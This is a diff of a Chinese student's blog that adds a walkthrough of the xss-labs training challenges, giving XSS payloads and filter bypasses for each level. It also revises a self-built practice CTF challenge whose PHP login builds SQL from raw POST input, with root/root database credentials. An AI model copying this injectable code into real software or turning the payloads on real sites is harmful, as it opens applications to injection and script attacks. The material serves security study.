@@ -64,6 +64,94 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xsslab" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/07/21/xsslab/" class="article-date">
+  <time datetime="2023-07-21T01:35:45.000Z" itemprop="datePublished">2023-07-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/07/21/xsslab/">2023/7/21：夏令营week2记录:xsslab</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script &quot;  &#x27;Oonn&gt; 可以用来测闭合</span><br></pre></td></tr></table></figure>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>将上面的test改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>检测搜索框内为双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>“&gt;”被替换了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&#x27; onclick=&#x27;alert(1) 补全标签</span><br></pre></td></tr></table></figure>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>查看源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;script &quot; &#x27;oonn&quot;=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>双引号闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&quot; onclick=&quot;alert(1) 补全标签</span><br></pre></td></tr></table></figure>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>关键词过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;scr_ipt &quot; &#x27;oo_nn=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<p>点一下下面的蓝色连接即可</p>
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>在上一题基础上有了更多过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a hr_ef=&quot;javascript:alert(1)&quot; &quot;=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=&quot;&gt;&lt;a hRef=&quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>
+<p>？上一题过滤大小写这题不过滤？</p>
+<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>似乎删掉了关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt; &quot; &#x27;on=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>onclick删了on,过滤了但没完全过滤（</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&quot; oonnclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>应该还是关键词过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&lt;scr_ipt &quot;  &#x27;oo_nn&gt;&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>大小写绕过无效，自动转换为小写<br>可以编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br><span class="line">以上字符串对javascript:alert(1)进行ascii编码</span><br></pre></td></tr></table></figure>
+<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;script &amp;quot;  &#x27;oonn&gt;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加友情链接&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>？不太对劲，百度下源码<br>要加个http://，剩下与第8题一样<br>只要有这个字段就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;(&#x27;http://&#x27;)</span><br><span class="line">刚开始还不知道拿这个http咋办，结果百度只要扔在后面就行</span><br></pre></td></tr></table></figure>
+<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>随便扔个关键字进去没反应<br>F12</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>url里的keyword估计啥用没有，再扔几下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;script &quot; &#x27;oonn&quot;=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
+<p>关键应该就是type把hidden改掉</p>
+<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>把上一题payload扔进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>试了半天都差不多这样，麻<br>查了源码是referer请求头注入<br>题目好像有提示我傻了<br>把上一题的payload扔到referer里就行</p>
+<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>又是请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>？服务器拒绝连接太6了<br>跳了不知道什么情况</p>
+<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>这题改cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>emm还要添个user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&quot; onclick=&#x27;alert(1)&#x27; type=&quot;text</span><br></pre></td></tr></table></figure>
+<h3 id="level-14-（写不出来）"><a href="#level-14-（写不出来）" class="headerlink" title="level 14 （写不出来）"></a>level 14 （写不出来）</h3><p>需要用到这个网站：<a target="_blank" rel="noopener" href="http://ww1.exifviewer.org/">http://ww1.exifviewer.org/</a> 需要梯子</p>
+<p>查了下解法：<br>1.查看源码是iframe框，src到上面的网站<br>2.burp抓包请求，返回有字段X-Frame-Options:SAMEORIGIN（我抓了，没有，可能是我的问题），表示该页面要在相同域名的iframe中展示，修改为：X-Frame-Options:ALLOW-FROM http://…/xss/level14.php<br>3.这个网站可以从任意图像文件提取元数据，往文件写入xss payload<br>4.使用火狐firebug将scrolling=”no”改为yes会出现滚动条<br>5.win7修改图片属性可直接修改EXIF的值<br>6.payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>在上传过程不断修改返回包的X-Frame-Options字段</p>
+<p>比前面的有趣，虽然我肯定不会写</p>
+<h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>…<br>后面都404了，在冬令营那会还没问题<br>先这样了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/21/xsslab/" data-id="clkcq8h4y0000qoud4jq9gifl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-week1plus" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/07/16/week1plus/" class="article-date">
@@ -86,16 +174,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><del>目前应该还没法用</del><br>参考（照搬了不少其实）了大佬的代码终于正常运行了，代码的问题估计比代码还多<br>结构：</p>
+        <p><del>目前应该还没法用</del><br><del>参考（照搬了不少其实）了大佬的代码终于正常运行了，代码的问题估计比代码还多</del><br>还是有不少语法错误，这次真能用了<br>结构：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sqltry/</span><br><span class="line">$ ├── docker-compose.yml</span><br><span class="line">$ ├── Dockerfile</span><br><span class="line">$ └── web</span><br><span class="line">$      ├── db.sql</span><br><span class="line">$      └── index.php  </span><br></pre></td></tr></table></figure>
 <p>index.php:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        veryeasysql</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;style&gt;body&#123;height:100%&#125;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;div class=&quot;index_01&quot;&gt;</span><br><span class="line">&lt;table style=&quot;width:100%;height:100;&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;table width=350 height=230 class=&quot;index_table&quot;&gt;</span><br><span class="line">        &lt;form method =&quot;POST&quot; action=&quot;index.php&quot; name=&quot;check&quot;&gt;</span><br><span class="line">        &lt;tr style=&quot;font-size: 25px;&quot;&gt;</span><br><span class="line">            &lt;td colspan=&quot;2&quot; style=&quot;font-size: 35px;&quot;&gt;查询&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td style=&quot;font-size: 25px;&quot;&gt;账号&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;name&quot; maxlength=&quot;30&quot; name=&quot;uid&quot; placeholder=&quot;请输入账号&quot; style=&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td style=&quot;font-size: 25px;&quot;&gt;密码&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;password&quot; type=&quot;password&quot; maxlength=&quot;30&quot; name=&quot;password&quot; placeholder=&quot;请输入密码&quot; style=&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;td colspan=&quot;2&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; class=&quot;btn&quot;&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;/from&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$id=$_POST[&#x27;uid&#x27;];</span><br><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    </span><br><span class="line">$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;kali&quot;);</span><br><span class="line">if($conn-&gt;connect_error)&#123;</span><br><span class="line">        die(&quot;数据库连接失败&quot;.$conn-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;select username, password from users where username= &#x27;$id&#x27; and password = &#x27;$password&#x27;&quot;;</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line">if($id == &quot;&quot; || $password == &quot;&quot;)&#123;</span><br><span class="line">    echo &quot;账号密码不能为空&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">if($result = mysqli_query($conn, $sql))&#123;</span><br><span class="line">if($row!=0)&#123;</span><br><span class="line">        echo &#x27;id:&#x27;.$row[&#x27;username&#x27;];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;password:&quot;.$row[&#x27;password&#x27;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        echo &quot;账号不存在或密码错误&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else echo &quot;出错！&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        veryeasysql</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;style&gt;body&#123;height:100%&#125;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;div class=&quot;index_01&quot;&gt;</span><br><span class="line">&lt;table style=&quot;width:100%;height:100;&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;table width=350 height=230 class=&quot;index_table&quot;&gt;</span><br><span class="line">        &lt;form method =&quot;POST&quot; action=&quot;index.php&quot; name=&quot;check&quot;&gt;</span><br><span class="line">        &lt;tr style=&quot;font-size: 25px;&quot;&gt;</span><br><span class="line">            &lt;td colspan=&quot;2&quot; style=&quot;font-size: 35px;&quot;&gt;查询&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td style=&quot;font-size: 25px;&quot;&gt;账号&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;name&quot; name=&quot;uid&quot; placeholder=&quot;请输入账号&quot; style=&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td style=&quot;font-size: 25px;&quot;&gt;密码&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;input type=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;请输入密码&quot; style=&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;td colspan=&quot;2&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; class=&quot;btn&quot;&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;/from&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$id=$_POST[&#x27;uid&#x27;];</span><br><span class="line">$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    </span><br><span class="line">$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;kali&quot;);</span><br><span class="line">if($conn-&gt;connect_error)&#123;</span><br><span class="line">        die(&quot;数据库连接失败&quot;.$conn-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;select * from users where username=&#x27;$id&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">print($sql);</span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line">if($id == &quot;&quot; || $password == &quot;&quot;)&#123;</span><br><span class="line">    echo &quot;账号密码不能为空&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">if($result)&#123;</span><br><span class="line">if($row)&#123;</span><br><span class="line">        echo &#x27;password:&#x27;.$row[1];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        // echo &quot;password:&quot;.$row[&#x27;password&#x27;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        echo &quot;账号不存在或密码错误&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else echo &quot;出错:&quot;.$conn-&gt;error;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>docker-compose.yml:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&quot;3&quot;</span></span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    image: sqli</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;400:80&quot;</span></span><br><span class="line">    deploy:</span><br><span class="line">      resources:</span><br><span class="line">        limits:</span><br><span class="line">          cpus: <span class="string">&#x27;0.50&#x27;</span></span><br><span class="line">          memory: 512M</span><br></pre></td></tr></table></figure>
 <p>Dockerfile:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM ctfhub/base_web_nginx_mysql_php_74</span><br><span class="line"></span><br><span class="line">COPY web /var/www/html</span><br><span class="line"></span><br><span class="line">RUN sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span><br><span class="line">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e <span class="string">&quot;source /var/www/html/db.sql&quot;</span> \</span><br><span class="line">    &amp;&amp; <span class="built_in">chown</span> -R www-data:www-data /var/www/html</span><br></pre></td></tr></table></figure>
 <p>db.sql:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS kali;</span><br><span class="line">USE kali;</span><br><span class="line"></span><br><span class="line">SET SQL_MODE = &quot;NO_AUTO_VALUE_ON_ZERO&quot;;</span><br><span class="line">START TRANSACTION;</span><br><span class="line">SET time_zone = &quot;+00:00&quot;;</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS users;</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(10) NOT NULL,</span><br><span class="line">  `password` varchar(30) NOT NULL,</span><br><span class="line">    PRIMARY KEY (username)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">INSERT INTO users ( &#x27;username&#x27;, &#x27;password&#x27; ) VALUES ( </span><br><span class="line">&#x27;admin&#x27;, &#x27;flag&#123;123abc#&#125;&#x27;); </span><br><span class="line">INSERT INTO users ( &#x27;username&#x27;, &#x27;password&#x27; ) VALUES ( </span><br><span class="line">&#x27;xin&#x27;, &#x27;DALLAS&#x27;); </span><br><span class="line">INSERT INTO users ( &#x27;username&#x27;, &#x27;password&#x27; ) VALUES ( </span><br><span class="line">&#x27;SALES&#x27;, &#x27;CHICAGO&#x27;); </span><br><span class="line">INSERT INTO users ( &#x27;username&#x27;, &#x27;password&#x27; ) VALUES ( </span><br><span class="line">&#x27;OPERATIONS&#x27;, &#x27;BOSTON&#x27;); </span><br><span class="line">commit;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS kali;</span><br><span class="line">USE kali;</span><br><span class="line"></span><br><span class="line">SET SQL_MODE = &quot;NO_AUTO_VALUE_ON_ZERO&quot;;</span><br><span class="line">START TRANSACTION;</span><br><span class="line">SET time_zone = &quot;+00:00&quot;;</span><br><span class="line"></span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(10) NOT NULL,</span><br><span class="line">  `password` varchar(30) NOT NULL,</span><br><span class="line">    PRIMARY KEY (`username`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;admin&#x27;, &#x27;flag&#123;123abc#&#125;&#x27;);</span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;xin&#x27;, &#x27;DALLAS&#x27;);</span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;SALES&#x27;, &#x27;CHICAGO&#x27;);</span><br><span class="line">INSERT INTO `users` (`username`, `password`) VALUES (&#x27;OPERATIONS&#x27;, &#x27;BOSTON&#x27;);</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure>
+<p>难度也变得非常智障</p>
+
       
     </div>
     <footer class="article-footer">
@@ -590,48 +680,6 @@ sql99优点：表连接的条件是独立的，连接之后，如果还需要进
 
 
   
-    <article id="post-water" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
